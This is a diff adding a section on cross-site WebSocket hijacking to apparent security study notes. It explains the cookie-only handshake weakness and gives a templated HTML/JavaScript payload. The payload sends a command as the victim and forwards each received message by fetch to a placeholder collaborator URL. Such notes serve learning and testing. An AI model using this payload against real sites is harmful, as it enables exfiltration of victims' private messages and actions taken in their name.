@@ -21,3 +21,18 @@ pagetitle: Websockets
 
 **Cross-site WebSocket Hijacking**
 - Results from cross-domain WebSocket connections from an attacker-controlled site
+- Happens when the Websocket handshake relies only on HTTP cookies and doesn't have any CSRF tokens
+  - Attacker can set up a malicious site to establish the cross-site websocket connection to read contents of messages
+- Payload:
+
+```
+<script>
+    var ws = new WebSocket('wss://{websocket_rl}');
+    ws.onopen = function() {
+        ws.send("{command_to_send_as_user}");
+    };
+    ws.onmessage = function(event) {
+        fetch('{collaborator_url}', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
